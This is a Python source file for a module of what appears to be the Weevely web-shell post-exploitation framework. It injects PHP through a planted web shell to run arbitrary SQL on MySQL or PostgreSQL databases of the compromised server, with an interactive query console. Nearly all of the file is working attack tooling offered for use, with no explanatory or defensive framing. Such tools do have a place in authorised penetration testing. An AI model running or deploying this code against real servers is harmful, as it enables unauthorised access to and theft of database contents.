import utils
from core import messages
from core.loggers import log
from core.module import Module
from core.vectors import PhpCode
import re

class Console(Module):
    """Execute SQL query or run console."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_vectors(
            [
                PhpCode(
                    """if($s=mysqli_connect('${host}','${user}','${passwd}')){$r=mysqli_query($s,'${query}');if($r){$f=mysqli_fetch_fields($r);foreach($f as $v){echo $v->name.'${linsep}';};echo '${colsep}';while($c=mysqli_fetch_row($r)){echo implode('${linsep}',$c);echo '${linsep}${colsep}';}};}echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error($s);@mysqli_close($s);""",
                    name='mysql',
                ),
                PhpCode(
                    """if($s=mysqli_connect('${host}','${user}','${passwd}','${database}')){$r=mysqli_query($s,'${query}');if($r){$f=mysqli_fetch_fields($r);foreach($f as $v){echo $v->name.'${linsep}';};echo '${colsep}';while($c=mysqli_fetch_row($r)){echo implode('${linsep}',$c);echo '${linsep}${colsep}';}};}echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error($s);@mysqli_close($s);""",
                    name='mysql_database',
                ),
                PhpCode(
                    """$r=mysqli_query('${query}');if($r){while($c=mysqli_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';}echo '${colsep}';}};mysqli_close();echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error();""",
                    name="mysql_fallback"
                ),
                PhpCode(
                    """if(pg_connect('host=${host} user=${user} password=${passwd}')){$r=pg_query('${query}');if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';}echo '${colsep}';}};pg_close();}echo '${errsep}'.@pg_last_error();""",
                    name="pgsql"
                ),
                PhpCode(
                    """if(pg_connect('host=${host} user=${user} dbname=${database} password=${passwd}')){$r=pg_query('${query}');if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';}echo '${colsep}';}};pg_close();}echo '${errsep}'.@pg_last_error();""",
                    name="pgsql_database"
                ),
                PhpCode(
                    """$r=pg_query('${query}');if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';} echo '${colsep}';}};pg_close();echo '${errsep}'.@pg_last_error();""",
                    name="pgsql_fallback"
                ),
            ]
        )

        self.register_arguments([
            {'name': '-user', 'help': 'SQL username'},
            {'name': '-passwd', 'help': 'SQL password'},
            {'name': '-host', 'help': 'Db host (default: localhost)', 'nargs': '?', 'default': 'localhost'},
            {'name': '-dbms', 'help': 'Db type', 'choices': ('mysql', 'pgsql'), 'default': 'mysql'},
            {'name': '-database', 'help': 'Database name'},
            {'name': '-query', 'help': 'Execute a single query'},
            {'name': '-encoding', 'help': 'Db text encoding', 'default': 'utf-8'},
        ])

    def _query(self, vector, args):

        # Randomly generate separators
        colsep = '----%s' % utils.strings.randstr(6).decode('utf-8')
        linsep = '----%s' % utils.strings.randstr(6).decode('utf-8')
        errsep = '----%s' % utils.strings.randstr(6).decode('utf-8')

        args.update(
            {'colsep': colsep, 'linsep': linsep, 'errsep': errsep}
        )

        # Escape ' in query strings
        self.args['query'] = self.args['query'].replace('\\', '\\\\').replace('\'', '\\\'')

        result = self.vectors.get_result(vector, args)

        # we wan't the result to be unicode, but depending on the source
        # of the data, it could be encoded differently
        try:
            result = str(result)
        except UnicodeError:
            result = str(result.decode(args.get('encoding')))
        # If there is not errstr, something gone really bad (e.g. functions not callable)
        if errsep not in result:
            return {
                'error': messages.module_sql_console.unexpected_response,
                'result': []
            }
        else:

            # Split result by errsep
            result, error = result.split(errsep)

            return {
                'error': error,
                'result': [
                    line.split(linsep) for line
                    in result.replace(linsep + colsep, colsep).split(colsep) if line
                ]
            }

    def run(self):

        # The vector name is given by the db type
        vector = self.args.get('dbms')
        encoding = self.args.get('encoding')
        database = self.args.get('database')

        # Check if PostgreSQL and database is given
        if database:
            vector += '_database'
        else:
            # And by the user and password presence
            vector += (
                '' if self.args.get('user') and self.args.get('passwd')
                else '_fallback'
            )

        # If the query is set, just execute it
        if self.args.get('query'):
            return self._query(vector, self.args)

        # Else, start the console.
        # Check credentials
        self.args['query'] = (
            'SELECT USER;' if vector.startswith('pgsql')
            else 'SELECT USER();'
        )

        result = self._query(vector, self.args)
        if not result['result']:
            return result

        if result['result'][0]:
            user = result['result'][1][0]

        # Console loop
        while True:

            query = input('{}:{} SQL> '.format(user, database)).strip()

            if not query:
                continue
            if query in ['quit', '\q', 'exit']:
                return {"result": "sql_console exited.", "error": False}
            m = re.findall("^use\s+([\w_]+);?$", query, re.IGNORECASE)
            if len(m):
                database = m[0]
                self.args.update({"database": database})
                print("databse changed to {}.".format(database))
                continue
            self.args['query'] = query
            result = self._query(vector, self.args)
            self.print_result(result)

    def print_result(self, result):

        if result['error']:
            log.info(result['error'])

        if result['result']:
            if type(result['result']) is str:
                log.info(result["result"])
            else:
                Module.print_result(self, result['result'], header=True)

        elif not result['error']:

            log.warn('%s %s' % (
                messages.module_sql_console.no_data,
                messages.module_sql_console.check_credentials)
                     )

            command_last_chars = utils.prettify.shorten(
                self.args['query'].rstrip(),
                keep_trailer=10
            )

            if (command_last_chars and command_last_chars[-1] != ';'):
                log.warn(messages.module_sql_console.missing_sql_trailer_s % command_last_chars)
